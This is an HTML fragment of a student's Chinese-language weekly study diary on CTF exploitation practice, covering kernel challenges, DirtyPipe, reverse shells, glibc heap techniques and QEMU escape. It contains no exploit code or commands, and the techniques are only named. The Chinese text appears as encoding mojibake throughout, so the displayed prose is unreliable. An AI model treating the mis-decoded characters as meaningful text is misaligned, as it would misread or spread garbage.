id="å¤§ä¸‰ç¬¬ä¸€å­¦æœŸ"><a href="#å¤§ä¸‰ç¬¬ä¸€å­¦æœŸ" class="headerlink" title="å¤§ä¸‰ç¬¬ä¸€å­¦æœŸ"></a>å¤§ä¸‰ç¬¬ä¸€å­¦æœŸ</h2><h3 id="ç¬¬åä¸‰å‘¨-9-5-9-11"><a href="#ç¬¬åä¸‰å‘¨-9-5-9-11" class="headerlink" title="ç¬¬åä¸‰å‘¨: 9/5-9/11"></a>ç¬¬åä¸‰å‘¨: 9/5-9/11</h3><ul><li>3-4: 64ä½no RELROçš„exp, é‡åˆ°ä¸€å †é—®é¢˜. æ€»ç®—è§£å†³äº†. 4å·ä¸‹åˆæ•´äº†vscodeå’Œchromeå®‰è£…è·¯å¾„, åˆ æ‰æ—§ç‰ˆ.</li><li>æ€ä¹ˆå­¦çš„è¿™ä¹ˆæ…¢?</li><li>5: 64 partial RELRO</li><li>6: 64çš„ç»ˆäºå®Œæˆäº†â€¦â€¦ ä¸è¿‡å¹¶æ²¡æœ‰Wikiä¸Šè¯´çš„é‚£ä¹ˆå¤šé—®é¢˜, åªæœ‰systemå¯¹é½å’Œä¼ªé€ è¡¨çš„åœ°å€å’Œæ ˆç©ºé—´çš„é—®é¢˜</li><li>7-8: 7å·æ²¡å¹²å•¥, ä¸Šè¯¾. 8å· HITCON CTF 2020 START!!</li><li>9: çœ‹äº†çœ‹revenge of pwn, è¿˜è¦ç ”ç©¶pwntoolsçš„æºç , çœŸä¸æ„§æ˜¯miscç±». çœ‹ä¸€åŠè½¬åˆ°kernelé¢˜Spark.</li><li>10: çœ‹æ‡µäº†. åœ¨IDAé‡Œåˆ†ækoçš„åæ±‡ç¼–â€¦.. </li><li>11: qiyz_ssyahu</li></ul><h3 id="ç¬¬åå››å‘¨-9-12-9-18"><a href="#ç¬¬åå››å‘¨-9-12-9-18" class="headerlink" title="ç¬¬åå››å‘¨: 9/12-9/18"></a>ç¬¬åå››å‘¨: 9/12-9/18</h3><ul><li>12: å±äºæ˜¯åªèƒ½ç…§ç€wpæ¥ç†è§£ä¸€ä¸‹åˆ°åº•æ€ä¹ˆåšé¢˜çš„â€¦.. è¿˜æ²¡æ•´å®ŒSpark. æ¢å¤koæ–‡ä»¶é‡Œçš„ç±»å‹ä¿¡æ¯éƒ½ç»™ç´¯æ­». </li><li>13: è°ƒè¯•spark <p hidden>ä¸ä¼šå§ä¸€é“é¢˜è¦çœ‹è¿™ä¹ˆå¤šå¤©???</p>  ç»ˆäºå®Œå…¨æ¢å¤äº†koæ–‡ä»¶çš„ç±»å‹ä¿¡æ¯. ææ˜ç™½äº†æµç¨‹. è¿™å‡ ä¸ªç»“æ„ä½“çœŸæ˜¯å¯ä»¥ä»é›¶å¼€å§‹çŒœæµ‹çš„? </li><li>14: è¿™expå¤æ‚ç¨‹åº¦åˆæ˜¯ç¬¬ä¸€æ¬¡è§äº†â€¦. å››ç™¾å¤šè¡Œ, ç”¨äº†userfaultfd+setxattr. è¿˜æ²¡çœ‹å‘¢.<br>æ„Ÿè§‰å¯ä»¥æ¯å¤©çœ‹ä¸‹how linux works. </li><li>15: çœ‹çš„å†…å®¹åŒæ˜¨æ—¥</li><li>16-18: çœ‹ä¹¦</li></ul><h3 id="ç¬¬åäº”å‘¨-9-19-9-25"><a href="#ç¬¬åäº”å‘¨-9-19-9-25" class="headerlink" title="ç¬¬åäº”å‘¨: 9/19-9/25"></a>ç¬¬åäº”å‘¨: 9/19-9/25</h3><ul><li>â€¦<p hidden>æ•ˆç‡è¿‡ä½äº†å§â€¦..å‘¨å…­æµªè´¹ä¸€å¤©,ç¡äº†å¥½ä¹…åˆç©æ¸¸æˆ,è¿™ç©æ„å„¿çœŸç‰¹ä¹ˆåœä¸ä¸‹æ¥</p></li><li>19-20: linuxé‚£æœ¬ä¹¦. </li><li>è¿˜æè¿™spark.</li><li>.<p hidden>ç¬¬åå…­å‘¨: 9/26-10/2  ä¸å¥½è¯„ä»·</p></li></ul><h3 id="ç¬¬åä¸ƒå‘¨-10-3-10-9"><a href="#ç¬¬åä¸ƒå‘¨-10-3-10-9" class="headerlink" title="ç¬¬åä¸ƒå‘¨: 10/3-10/9"></a>ç¬¬åä¸ƒå‘¨: 10/3-10/9</h3><ul><li>345: çœ‹å®Œäº†spark. è¿›åº¦æœ€æ…¢çš„ä¸€æ®µæ—¶é—´. </li><li>6: æ˜¨æ™šé—®äº†skr, æˆ‘å†³å®šåŠ å…¥r3kapigæˆ˜é˜Ÿ. æ²¡æƒ³åˆ°éƒ½ä¸ç”¨é¢è¯•ç›´æ¥è¿›çš„. ç„¶åå‘ç°CSR CTFé©¬ä¸Šè¦å¼€å§‹äº†, çœ‹äº†çœ‹å¾€å¹´çš„é¢˜ç›®.</li><li>7: çœ‹ä¸æ‡‚, å±…ç„¶è¿˜æœ‰ä»¥å¤ªåŠçš„é¢˜ç›®, ä¸è¿‡é¡ºå¸¦çœ‹çœ‹ä»¥å¤ªåŠæ˜¯ä¸ªå•¥. </li><li>8-9: è¿˜æ˜¯æ³¨å†Œäº†ä¸€ä¸ªé˜Ÿä¼, ä¸è¿‡åªåšå‡ºæ¥äº†ç­¾åˆ°é¢˜â€¦.è¿™CSRç»¼åˆåº¦å¤ªé«˜äº†, åˆ°å¤„éƒ½æ˜¯çŸ¥è¯†ç›²åŒº, ä¸æ˜¯ä¼ ç»ŸPWNæ–¹å‘çš„é¢˜ç›®. </li></ul><h3 id="ç¬¬åå…«å‘¨-10-10-10-16"><a href="#ç¬¬åå…«å‘¨-10-10-10-16" class="headerlink" title="ç¬¬åå…«å‘¨: 10/10-10/16"></a>ç¬¬åå…«å‘¨: 10/10-10/16</h3><ul><li>10: çœ‹äº†çœ‹ASIS CTFçš„å¾€å¹´é¢˜ç›®, å†³å®šå‚åŠ ä¸‹å‘¨å…­çš„æ¯”èµ›è¯•è¯•â€¦.è¿™æ¬¡æ˜¯æœ‰ä¼ ç»Ÿpwné¢˜çš„, å¥½åƒæ— å†…æ ¸é¢˜ç›®. </li><li>11: åˆ°äº†éš¾åº¦2/4çš„é¢˜ç›®, çŸ­çŸ­å‡ åè¡Œå´çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆé—®é¢˜â€¦.</li><li>12-16: åšå®Œäº†strvec, æ‰æƒ³èµ·æ¥tcacheå°±æ˜¯heapå‰é¢é‚£ä¸ª0x290çš„chunk. é¡ºå¸¦ä½“éªŒäº†ä¸€ä¸‹ASIS CTF 2022, ç»“æœç­¾åˆ°é¢˜éƒ½çœ‹åŠå¤©, ç¬¬ä¸€ä¸ªç›´æ¥ç”¨äº†éé¢„æœŸè§£, ç¬¬äºŒä¸ªéƒ½å¿˜äº†%n$è¿™ä¸ªæ“ä½œ.<br>é¡ºå¸¦ç»§ç»­åšå®ŒASIS2021çš„pwné¢˜, é¡ºä¾¿ä½“éªŒä¸€ä¸‹revçš„é¢˜ç›®.<br>ä¸‹ä¸€ä¸ªæ‰“ç®—åšåšsekai ctfçš„é¢˜ç›®, å®˜æ–¹è‡ªå¸¦wp, çˆ±äº†, å°±åšä¸ªä¸¤å¹´ä»½çš„, é¡ºå¸¦çœ‹çœ‹å…¶ä»–ç±»åˆ«çš„é¢˜ç›®é•¿é•¿è§è¯†.<br>è§åˆ°äº†forensics &amp; ppcç±»åˆ«çš„é¢˜ç›®. </li></ul><h3 id="ç¬¬åä¹å‘¨-10-17-10-23"><a href="#ç¬¬åä¹å‘¨-10-17-10-23" class="headerlink" title="ç¬¬åä¹å‘¨: 10/17-10/23"></a>ç¬¬åä¹å‘¨: 10/17-10/23</h3><ul><li>17-18: è¿™ä¸¤å¤©éƒ½æ˜¯readableçš„expå­¦ä¹ , é¡ºå¸¦å¦‚ä½•ä½¿ç”¨æä¾›çš„dockerç¯å¢ƒå’Œéƒ¨ç½²è„šæœ¬, çŸ¥é“äº†å…¶ä¸­ä¸€ç§éé¢„æœŸè§£, ä½†æ˜¯æ²¡æœ‰è·‘é€š, å¦ä¸€ç§é˜Ÿé‡Œçš„éé¢„æœŸè§£æ²¡æ‡‚, è¿˜æœ‰é¢„æœŸè§£è¿˜éœ€è¦çœ‹. é¢„è®¡åˆè¦çœ‹ä¸ªä¸€å‘¨äº†, å­¦æ ¡è¿˜æœ‰ä¸€äº›å…¶ä»–çš„äº‹æƒ…. </li><li>19: é¢„æœŸè§£+x32_abiè§£. </li><li>20: x32abitå¬è¯´ubuntu18å¯ç”¨ | ç»§ç»­intended solution. </li><li>21: å®Œæˆ, çœ‹äº†ä¸¤çœ¼babyscan, åŸæ¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å†…å®¹, å·®ç‚¹å¿˜äº†. çœ‹äº†çœ‹jsy. </li><li>22: ç»§ç»­jsy. æ²¡çœ‹ä¸¤çœ¼å‘ç°hackergameå¼€äº†, ä¸å‡ºæ‰€æ–™çš„æ²¡ä¼šå‡ é¢˜, web mathåŸºæœ¬ç›´æ¥æ”¾å¼ƒ. </li><li>23: çœ‹namespace. man pageçœŸçš„å¤š, ä½†æ˜¯å…¨. </li></ul><h3 id="ç¬¬äºŒåå‘¨-10-24-10-30"><a href="#ç¬¬äºŒåå‘¨-10-24-10-30" class="headerlink" title="ç¬¬äºŒåå‘¨: 10/24-10/30"></a>ç¬¬äºŒåå‘¨: 10/24-10/30</h3><ul><li>24: (user)<a href="https://blog.quarkslab.com/digging-into-linux-namespaces-part-2.html">namespace</a> + capabilities, æ‰‹å†Œçš„ä¸œè¥¿çœŸçš„å¤š. </li><li>25-26: è¿˜çœ‹äº†credentialsç­‰ç­‰. åœ¨é¢˜ç›®é‚£é‡Œæ•´ç†äº†ä¸€ä¸‹. è¿˜æ˜¯é wpå§. </li><li>27: çœ‹rust, å‡†å¤‡å…¥ä¸ªrust-pwnçš„å°é—¨. </li><li>28: rust</li><li>29: çœ‹äº†ä¸‹hack.lu. åˆå¤œå¼€çš„æ¯”èµ›, ä¸€è§‰é†’æ¥pwné¢˜éƒ½æ²¡å‡ ä¸ªè§£å‡ºæ¥çš„. ä¼°è®¡æˆ‘ä¹Ÿè§£ä¸å‡ºæ¥.<br>çƒ¦çš„è¦å‘½, kaliçš„dpkgä¸æ”¯æŒzstå‹ç¼©, ä¹Ÿä¸çŸ¥é“æ€ä¹ˆåœ¨debianä¸Šå¼„2.34glibc, ä¸ºäº†è¿è¡Œç¨‹åºåªèƒ½è½¬åˆ°ubuntu, dpkgæ˜¯å¯ä»¥çš„.<br>ä¸è¿‡è¿˜è¦è£…proxychain patchelf chekcsecç­‰ç­‰ç­‰çœŸå®å¤Ÿéº»çƒ¦. sudoä¹Ÿæ‰“ä¸ä¹ æƒ¯. å¥½çš„ç¯å¢ƒæ­ä¸èµ·æ¥å†è§hacklu.</li><li>30: ç ”ç©¶placematçš„æ±‡ç¼–å±‚é¢c++ class, å½“åšå¤ä¹ äº†ä¸€ä¸‹ç±»ç»§æ‰¿è™šè¡¨å•¥çš„. åˆæ˜¯å•¥éƒ½æ²¡åšå‡ºæ¥çš„ä¸€æ¬¡æ¯”èµ›. </li></ul><h3 id="ç¬¬äºŒåä¸€å‘¨-10-31-11-6"><a href="#ç¬¬äºŒåä¸€å‘¨-10-31-11-6" class="headerlink" title="ç¬¬äºŒåä¸€å‘¨: 10/31-11/6"></a>ç¬¬äºŒåä¸€å‘¨: 10/31-11/6</h3><ul><li>31: hackluè®¨è®ºé‡Œæœ‰å„é¢˜wp, è¿˜ä¸é”™åˆå¾—çœ‹ä¸ªå‡ å¤©äº†. </li><li>1: éƒ½åœ¨çœ‹placemat, ä¸»è¦æ˜¯c++çš„å„ç§ä¸œè¥¿, å½“ç„¶è¿˜æœ‰printfè¿™ç§ç®€å•ä½†åˆå¤æ‚çš„å‡½æ•°â€¦â€¦â€¦â€¦..</li><li>2-6: C++ ABI å‘¨æœ«è¿åŠ¨ä¼š.<br>æˆ‘å±…ç„¶çœ‹äº†è¿™ä¹ˆå¤šå¤©</li></ul><h3 id="ç¬¬äºŒåäºŒå‘¨-11-7-11-13"><a href="#ç¬¬äºŒåäºŒå‘¨-11-7-11-13" class="headerlink" title="ç¬¬äºŒåäºŒå‘¨: 11/7-11/13"></a>ç¬¬äºŒåäºŒå‘¨: 11/7-11/13</h3><ul><li>7: æ²¡åšå•¥ <p hidden>åœ¨pddæ·˜å®äº¬ä¸œç£¨è¹­ä¹°è·‘æ­¥è£¤å­</p> </li><li>8: ç»ˆäºæå®šplacemat. å…¨å‡­è‡ªå·±å¼„äº†. çœ‹çœ‹riot. </li><li>9: dirtypipeç¯å¢ƒæ­å»º, æ•´åŠå¤©linuxç¼–è¯‘, æ‰“äº†ä¸¤ä¸ªpatchæ‰èƒ½ç”¨. </li><li>10: ç»§ç»­dirtypipe. çœ‹äº†çœ‹cm4all teamçš„å…³äºå¦‚ä½•å‘ç°è¯¥æ¼æ´çš„blog.</li><li>11-13: ç»§ç»­dirtypipe. </li></ul><h3 id="ç¬¬äºŒåä¸‰å‘¨-11-14-11-20"><a href="#ç¬¬äºŒåä¸‰å‘¨-11-14-11-20" class="headerlink" title="ç¬¬äºŒåä¸‰å‘¨: 11/14-11/20"></a>ç¬¬äºŒåä¸‰å‘¨: 11/14-11/20</h3><ul><li>14: åšå®Œäº†dirtypipeçš„ppt, ä¸»è¦æ˜¯æ€è€ƒå¦‚ä½•è®²è§£. é™¤äº†åŸç†è¿˜è¯»äº†å‘ç°è€…çš„blog, çœ‹äº†ä¸‹æ˜¯æ€ä¹ˆå‘ç°çš„, çœ‹äº†ä¸€å †ä¸œè¥¿æ¯”å¦‚zip zlib. åˆçœ‹äº†å‡ ä¸ªexpå®è·µäº†ä¸€ä¸‹, åŠ ä¸Šçœ‹åˆ°äº†x32 abiçš„ç¼–è¯‘é€‰é¡¹è§£å†³äº†ASIS2022 readableçš„ä¸€ç§æ–¹æ³•. æŒºèŠ±æ—¶é—´çš„, ä¸è¿‡è¿˜ç®—çœ‹äº†ä¸å°‘ä¸œè¥¿.<br>çœ‹ordersystem, <strong>éº»çƒ¦è®°å¾—æœ‰é—®é¢˜å…ˆé‡å¯</strong> </li><li>15: çœ‹ordersystem, æ¶‰åŠåˆ°äº†åå¼¹shell, å³reverse shell. åˆå¼€å§‹çœ‹python bytecode. </li><li>16: ç»§ç»­å­—èŠ‚ç . <a href="https://realpython.com/inner-functions-what-are-they-good-for/">python nested function</a> | </li><li>17: åˆæƒ³å¼€å§‹å¤ä¹ ä¸€ä¸‹ç¼–è¯‘åŸç†äº†, è¯¶æ—¶é—´ä¸å¤ªå¤Ÿ | <a href="https://stackoverflow.com/questions/1301346#answer-59066258">underscore in python</a> </li><li>18: æ•´äº†ç‚¹å­¦æ ¡é‡Œæ²¡ç”¨çš„å®éªŒæŠ¥å‘Š, ä¸è¿‡å€’æ˜¯çœ‹äº†ä¸€äº›è·¯ç”±å™¨å‘½ä»¤è¡Œé…ç½® | ç»§ç»­bytecode</li><li>19-20: æ²¡å•¥å˜åŒ–, è¿˜çœŸçš„çœ‹äº†ä¸€ä¸ªæ˜ŸæœŸå•Š. <p hidden>å‘¨å…­ç¤¾å›¢, å¼€æ‘†äº†ä¸€å¤©, çœ‹ä¸ƒä¸ªå°æ—¶æ‰‹æœºç©ä¸€æ™šä¸Šæ¸¸æˆ, ç»äº†</p><br>ä¸€çŸ¥åŠè§£æ€»æ˜¯ä»¤äººéš¾å—, å†³å®šçœ‹å®Œcpythonçš„æ‰€æœ‰æµç¨‹. </li></ul><h3 id="ç¬¬äºŒåå››å‘¨-11-21-11-27"><a href="#ç¬¬äºŒåå››å‘¨-11-21-11-27" class="headerlink" title="ç¬¬äºŒåå››å‘¨: 11/21-11/27"></a>ç¬¬äºŒåå››å‘¨: 11/21-11/27</h3><ul><li>21: python internal</li><li>22: æ‰¾äº†åŠå¤©æ²¡çœ‹åˆ°å•¥æœ‰ç”¨çš„, rstæ’ä»¶å…¨éƒ½å‡ºé”™, ä»€ä¹ˆsys.exc_info()æ”¾åœ¨withè¯­å¥é‡Œä¹Ÿä¸çŸ¥é“åšå•¥çš„, æŠŠ3.11æºç å¼„æˆæœ¬åœ°repoç„¶åå¯»æ‰¾call_method&amp;load_method. æŠ˜è…¾ä¸€å¤§åœˆ, ä¸å¦‚çœ‹çœ‹<code>test_test()</code>çš„disç»“æœ, , , , ,</li><li>23: è½¬äº†ä¸€å¤§åœˆ, é‡æ–°æ¥çœ‹æ‰‹å†™çš„bytecode, ç»ˆäºå…¨å¼„æ˜ç™½é‡Œé¢æ¯ä¸€æ­¥æ“ä½œäº†, æ¥ä¸‹æ¥æ˜¯å¤ç° </li><li>24: python decoratorç”¨æ³•:<a href="https://www.geeksforgeeks.org/decorators-in-python/">geeks</a>/<a href="https://docs.python.org/3.11/reference/compound_stmts.html#function-definitions">pydoc_func</a> | functiontools.partial | what is <a href="https://stackoverflow.com/questions/6476825/what-do-double-parentheses-mean-in-a-function-call-e-g-funcfoobar">func(foo)(bar)</a><br>çœ‹äº†çœ‹pwncliçš„ç”¨æ³•, è™½ç„¶å¥½ç”¨ä½†æ˜¯åˆæ˜¯ä¸€ä¸ªå­¦ä¹ æˆæœ¬è´Ÿæ‹…, æˆ‘å·²ç»å¤„åœ¨å­¦ä¹ é€Ÿåº¦è·Ÿä¸ä¸Šç”¨çš„é€Ÿåº¦çš„çŠ¶æ€äº†. å‘¨æœ«è¿˜æœ‰hitcon ctf, è¿™ç§éš¾åº¦æˆ‘å¤šåŠåˆæ˜¯é˜Ÿé‡Œé™ªè·‘. å“hack.luçš„é¢˜è¿˜è¦çœ‹å®Œå—?è¿˜æœ‰ä¹‹å‰çš„seccon ctfè¿˜æ²¡çœ‹å‘¢. </li><li>25: å¿™ç€å¤ç°, è‡ªå·±å†™çš„æ—¶å€™åˆæ˜¯ä¸€å †é—®é¢˜ <ul><li>åœ¨windowsä¸Šè£…äº†pwntools, æ„Ÿè§‰åº”è¯¥ä¸å¤ªèƒ½ç”¨å§â€¦å¾…ç ”ç©¶. </li><li>åˆæ˜¯sendlineè¢«è¯†åˆ«æˆnoreturn, æ‰‹åŠ¨åœ¨sendrawä¸­åŠ å…¥return </li><li>hitconç›´æ¥å‡ºæ¥äº›vm escape, browserä¹‹ç±»çš„é¢˜ç›®. å®Œå…¨æ²¡çœ‹è¿‡å•Šå–‚ </li></ul></li><li>26: è¿˜tmçš„æ˜¯å¤ç°<ul><li>çœ‹åˆ°ç¾¤é‡Œæœ‰äººè¯´userfaultfdæœ‰ä¸ªç±»ä¼¼çš„æŠ€æœ¯å«åšFUSE. å¾—, åˆæ˜¯ä¸ªæ²¡è§è¿‡çš„ä¸œè¥¿. æœä¸€ä¸‹.  <strong>L</strong>ocal <strong>P</strong>rivilege <strong>E</strong>scalation (LPE)</li><li>æˆåŠŸäº†. æˆ‘é€æ¸ç†è§£äº†ä¸€åˆ‡. </li></ul></li><li>27: ä¸ºäº†hackluçš„byoråˆç»§ç»­å¼€å§‹<a href="https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">house of apple</a>. åˆæ˜¯ä¸€ä¸ªå¤§å‘, FSOPéƒ½è¿˜æ²¡çœ‹. secconä¹Ÿæ²¡çœ‹, hitconæ›´æ²¡çœ‹, sekaiä¸çŸ¥é“å•¥æ—¶èƒ½çœ‹. å…ˆä¸çœ‹äº†. <ul><li>å»äº†ä¸‹ä¿¡å®‰åä¼š, åœ¨è€ƒè™‘æˆ‘çœŸçš„æƒ³åšç ”ç©¶ä¹ˆ? å¯èƒ½ä¹Ÿä¸æ˜¯å¾ˆæƒ³åš. ç°åœ¨ä¹Ÿè¯¥åšäº›real-worldçš„ä¸œè¥¿äº†, ctfé¢˜ç›®çœŸæ˜¯ä¸€ç¾¤èŒä¸šè€æ‰‹æå‡ºæ¥ç©ç©çš„ä¸œè¥¿, æˆ‘ä¸€ä¸‹åšè¿™ç§ä¸–ç•ŒèŒƒå›´çš„æ¯”èµ›è¿˜æ˜¯éš¾é¡¶, è€Œä¸”æ¯ä¸€ä¸ªé¢˜ç›®çš„æ–¹å‘çš„å°å…¥é—¨éƒ½èƒ½çœ‹ä¸€ä¸¤ä¸ªæ˜ŸæœŸ. </li></ul></li></ul><h3 id="ç¬¬äºŒåäº”å‘¨-11-28-12-4"><a href="#ç¬¬äºŒåäº”å‘¨-11-28-12-4" class="headerlink" title="ç¬¬äºŒåäº”å‘¨: 11/28-12/4"></a>ç¬¬äºŒåäº”å‘¨: 11/28-12/4</h3><ul><li>28: è¿·èŒ«ä¸­, æ­£åœ¨å¤ä¹ ç¼–è¯‘åŸç†æ‰“ç®—ç»§ç»­å­¦ä¸­é—´ä»£ç ä¼˜åŒ–å’Œæ’æ¡©. cs143çš„ç¬”è®°å†™å¾—ä¹Ÿå¤ªç®€æ´äº†, é‡çœ‹çš„æ—¶å€™åŸºæœ¬å’Œæ²¡æœ‰ä¸€æ ·. å¹¸å¥½è¿˜æ˜¯è®°å¾—å¤§æ¦‚çš„æµç¨‹çš„. </li><li>29: å¤ä¹ , è¡¥å……ç¬”è®°. è§£å†³äº†typoraå’Œvscode<a href="https://github.com/microsoft/vscode/issues/146381">ç”±äºgpuåŠ é€Ÿå¯¼è‡´çš„æ˜¾ç¤ºæ¨¡ç³Š</a>â€“å‚æ•°åŠ ä¸Š<code>--disable-gpu</code>. </li><li>30-1: æ²¡å•¥ç‰¹åˆ«çš„. æ•´äº†ç‚¹å­¦æ ¡çš„æ— èŠæŠ¥å‘Š. </li><li>2: æ•´æŠ¥å‘Š |  <code>$@ $*</code>çš„<a href="https://stackoverflow.com/questions/22589032">åŒºåˆ«</a> | </li><li>3-4: å¤ä¹ è¡¥å……å®Œäº†, 4å·æ™šä¸Šå¼€å§‹CSCD70 </li></ul><h3 id="ç¬¬äºŒåå…­å‘¨-12-5-12-11"><a href="#ç¬¬äºŒåå…­å‘¨-12-5-12-11" class="headerlink" title="ç¬¬äºŒåå…­å‘¨: 12/5-12/11"></a>ç¬¬äºŒåå…­å‘¨: 12/5-12/11</h3><ul><li>5: <del>llvm. ä¸€ä¸ªç¯å¢ƒèµ·ä¸æ¥, ubuntu dockerè«åæŠ½é£, kaliæ²¡æ³•apt llvm-12. æˆ‘: ?????</del> å‘ç°åªæ˜¯docker contextçš„é—®é¢˜.</li><li>6: çº ç»“ä¸­. æ²¡ä¸œè¥¿å­¦è®©æˆ‘å¾ˆç„¦è™‘, æœ€ç›´æ¥çš„æ˜¯åœ¨è¿™é‡Œå†™ä¸äº†ä¸€è¡Œå­—. éšä¾¿çœ‹ç‚¹PEçš„æ ¼å¼å’Œqemué€ƒé€¸(åŒ…æ‹¬æ˜å¤©). </li><li>7: ?</li><li>8-9: çœ‹ç‚¹llvmåŠ ä¸Šqemué€ƒé€¸</li><li>10: RCTFçœ‹ä¸¤çœ¼(åªä¼šçœ‹ä¸¤çœ¼, traitsç›´æ¥åˆåŠé€€äº†) + modern C++è¿™ä¹¦å¯ä»¥çœ‹çœ‹, <del>å› ä¸ºä¸€ä¸ªallocatoråˆå»æŸ¥èµ„æ–™äº†.</del> å¥½å§å’Œallocatoræ— å…³.<br>å·²ç»åœ¨é©¬ä¸åœè¹„çš„å­¦C++20 qemué€ƒé€¸ rustäº†, è¿˜æœ‰fuzzå’Œä¸€å †ä¸çŸ¥é“å…¶å­˜åœ¨çš„æŠ€æœ¯<br>modern C++æœ‰ç©ºå°±çœ‹ä¸€ç‚¹å§â€¦. æœ‰ç‚¹å­¦ç´¯äº†, å­¦ä¸å®Œä¸»è¦æ˜¯, è¿˜æ²¡ä»€ä¹ˆæˆæœ. ä¸‹å‘¨å»å®ä¹ çœ‹çœ‹å§, çœ‹èµ·æ¥æ€ä¹ˆå°±ä¸€ä¸ªæ˜ŸæœŸ..?</li><li>11: å‘ƒ, çœ‹äº†ç‚¹qemu</li></ul><h3 id="ç¬¬äºŒåä¸ƒå‘¨-12-12-12-18"><a href="#ç¬¬äºŒåä¸ƒå‘¨-12-12-12-18" class="headerlink" title="ç¬¬äºŒåä¸ƒå‘¨: 12/12-12/18"></a>ç¬¬äºŒåä¸ƒå‘¨: 12/12-12/18</h3><ul><li><p>12-14: å®ä¹ . çœ‹ä¹¦åŠ ä¸Šå¸®ç‚¹å°å¿™. <p hidden>å•¥æµç¨‹éƒ½å±äºä¿å¯†èŒƒå›´, åªèƒ½å†™å†™é‚£æœ¬ä¹¦ä¸Šçš„ä¸œè¥¿</p> </p><div class="hljs code-wrapper"><pre><code>è£…äº†pdf xchange editor, æ¢æ‰äº†xodoè¿™ä¸ªå¥‡è‘©ç©æ„å„¿. å¤©å¤©ç»™æˆ‘æ•´é»‘å±. ç„¶åè£…è£…è™šæ‹Ÿæœº, æå®šäº†32/64ä½è½¯ä»¶ç‰ˆæœ¬é—®é¢˜(52pojiexpä¸Šç›´æ¥å°±æ˜¯32ä½çš„), ç„¶åè‡ªå·±è¯•è¯•åˆ†æçœŸå®ç¨‹åº. ctfè¿˜æ˜¯å¤ªç„ä¹äº†. å‘ç°çš„é—®é¢˜è¿˜æ˜¯å†™åœ¨malware-analysisé‡Œé¢. </code></pre></div></li><li><p>15-17: éƒ½åœ¨çœ‹ä¹¦, ç®€å•çš„çœ‹äº†ä¸€é. å…­ç™¾é¡µçš„ä¹¦ç›´æ¥è¿‡äº†ä¸€é. </p></li><li><p hidden>...èµ¶åœ¨ç¬¬ä¸€æ³¢é˜³äº†, èˆå‹ä½ å¹²çš„å¥½å•Š</p></li></ul><h3 id="ç¬¬äºŒåå…«ä¹å‘¨-12-19-1-1"><a href="#ç¬¬äºŒåå…«ä¹å‘¨-12-19-1-1" class="headerlink" title="ç¬¬äºŒåå…«ä¹å‘¨: 12/19-1/1"></a>ç¬¬äºŒåå…«ä¹å‘¨: 12/19-1/1</h3><ul><li>19-21: å®¿èˆé¢“åºŸä¸­</li><li>22-25: å¿«æ¢å¤äº†ä½†æ˜¯æ„å¤–çš„æ²¡åŠ¨åŠ›å­¦. çœŸæ˜¯ç½•è§. </li><li>26-31: ?</li><li>1: çœ‹äº†çœ‹ASIS Final, ä¸å‡ºæ„æ–™çš„æ²¡å•¥å¸®åŠ©, æƒ³äº†æƒ³è¿˜æ˜¯å›é¡¾ä¸‹RCTFçš„C++ Reverse.</li></ul><h3 id="ç¬¬ä¸‰åä¸€å‘¨-1-2-1-15"><a href="#ç¬¬ä¸‰åä¸€å‘¨-1-2-1-15" class="headerlink" title="ç¬¬ä¸‰åä¸€å‘¨: 1/2-1/15"></a>ç¬¬ä¸‰åä¸€å‘¨: 1/2-1/15</h3><ul><li>2: çœ‹C++. æ„Ÿè§‰cppreferenceä¸Šçš„å¯ä»¥è¿‡ä¸€ä¸‹. è¿™ä¸ªæ—¶å€™åˆå›æƒ³èµ·æ¥modern cppäº†, èµ¶ç´§æ¡èµ·æ¥ä¸€èµ·çœ‹çœ‹.</li><li>3-4: Diary C++é€†å‘. çœ‹äº†ä¸‹æŸä½ä¸€å¼€å§‹å°±å­¦è¿‡çš„SGI STL, ç¨å¾®çœ‹ä¸¤çœ¼ä¹Ÿä¸æ˜¯å®Œå…¨ä¸æ‡‚. è‡ªå·±å†™ä¸¤ä¸‹ä»£ç å¯¹ç…§ç€å¤ç°ä¸‹C++æºç .</li><li>5-12: </li><li>15:  ? <p hidden>ç©äº†æ­»äº¡ææµ… åƒç´ å·¥å‚ åå·´æ‹‰, ç„¶åé¡¿æ‚Ÿæ¸¸æˆåªæ˜¯æµªè´¹æ—¶é—´, å…¨éƒ½å¸è½½äº†</p> </li></ul><h3 id="ç¬¬ä¸‰åäºŒä¸‰å‘¨-1-16-1-29"><a href="#ç¬¬ä¸‰åäºŒä¸‰å‘¨-1-16-1-29" class="headerlink" title="ç¬¬ä¸‰åäºŒä¸‰å‘¨: 1/16-1/29"></a>ç¬¬ä¸‰åäºŒä¸‰å‘¨: 1/16-1/29</h3><ul><li>19: çœ‹å®Œäº†Diary, æ…¢å¾—ç¦»è°±.</li><li>20: BFC, åˆæ˜¯C++é€†å‘. å»å¹´é™¤å¤•å¤œåœ¨çœ‹è®¡ç½‘, ä»Šå¹´é™¤å¤•å¤œä¹Ÿå¾—çœ‹ç‚¹å•¥æ‰è¡Œ. è¯´ä¸å®šå°±æˆæˆ‘çš„æƒ¯ä¾‹äº†å‘¢(wwwwww)</li><li>21: é™¤å¤•å¤œåœ¨çœ‹STLæºç å‰–æ, ä¸é”™. </li><li>22: çœ‹äº†ç‚¹ä¹¦, åˆ°P113</li><li>23-24: çœ‹ä¹¦</li><li>25: çœ‹çº¢é»‘æ ‘å’Œmapçš„æºç . </li><li>29: åšbffcåˆè§C++ ABI. </li></ul><h3 id="ç¬¬ä¸‰åå››å‘¨-1-30-2-5"><a href="#ç¬¬ä¸‰åå››å‘¨-1-30-2-5" class="headerlink" title="ç¬¬ä¸‰åå››å‘¨: 1/30-2/5"></a>ç¬¬ä¸‰åå››å‘¨: 1/30-2/5</h3><ul><li>3031: æä¸æ˜ç™½æš‚æ—¶æ²¡æ•´house of apple. çœ‹çœ‹GAME. </li><li>1-3: çœ‹GAMEä¸­, ä¸œæŸ¥è¥¿æŸ¥æŠ˜è…¾åŠå¤©æ²¡çœ‹æ˜ç™½. è¿˜è¢«gefæŠ½é£æ•´å‚»äº†(ä¸€ä¸ªå¤šå°æ—¶). <ul><li><a href="https://unix.stackexchange.com/questions/197225/is-vmlinuz-and-bzimage-really-the-same">vmlinuz &amp;&amp; bzImage</a> 